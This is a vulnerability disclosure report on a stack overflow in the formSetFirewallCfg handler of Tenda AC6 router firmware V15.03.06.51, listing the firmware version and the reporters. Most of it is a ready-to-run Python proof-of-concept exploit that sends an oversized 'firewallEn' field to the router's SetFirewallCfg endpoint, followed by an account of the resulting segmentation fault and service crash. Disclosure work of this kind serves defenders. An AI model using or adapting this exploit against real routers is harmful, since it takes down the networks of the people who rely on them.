# Information

**Vendor of the products:** Tenda

**Vendor's website:** [腾达(Tenda)官方网站](https://www.tenda.com.cn/)

**Reported by:** Wang Jinshuai(jinshuaiwang61@gmail.com) ，Zhao Jiangting(sta8r9@163.com)

**Affected products:** AC6 AC1200 

**Affected firmware version:**  AC6V2.0RTL_V15.03.06.51

**Firmware download address:** [AC6 v2.0 固件-腾达中国](https://www.tendacn.com/us/download/detail-3794.html)

# Overview

A **stack overflow vulnerability** in the `formSetFirewallCfg` function in AC6V2.0RTL_V15.03.06.51 allows an attacker to construct an excessively long value for the `firewallEn` variable, leading to a stack overflow and potentially resulting in a DDoS attack.

# Vulnerability details

Analyzing the `formSetFirewallCfg` function in this file reveals that when the `firewallEn` variable contains an excessively long string, such as 400 consecutive "a" characters, a stack overflow occurs. This happens because the `firewall_buf` variables lack sufficient buffer space and overflow when the value is copied using the `strcpy` function.

![image-20250313210932186](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503132109553.png)

Cross-referencing the `formSetFirewallCfg` function, it can be observed that it is indeed called by the formDefineTendDa function. As a result, an attacker can cause a DDoS attack on the router.

![image-20250313210741170](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503132107668.png)



# Poc

By changing the IP and token to the target router's IP and token, the attack can be successfully carried out.

```python
import requests
ip='192.168.0.34'
url = f"http://{ip}/goform/SetFirewallCfg"

headers = {
    "Host": "192.168.0.198",
    "Connection": "keep-alive",
    "Content-Length": "31",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.0.198",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.0.198/goform/WriteFacMac",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie": "password=wtfbro",
}

data = {
    "firewallEn": "a"*0x400,
}

response = requests.post(url, headers=headers, data=data)
print(response.status_code)
print(response.text)

```

# Attack Demonstration

At this point, the service is functioning normally.

![image-20250312223640285](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122240094.png)

The script attack was successful, causing a segmentation fault.

![image-20250312223758005](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122240127.png)

The service crashed.

![image-20250312223915278](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122240425.png)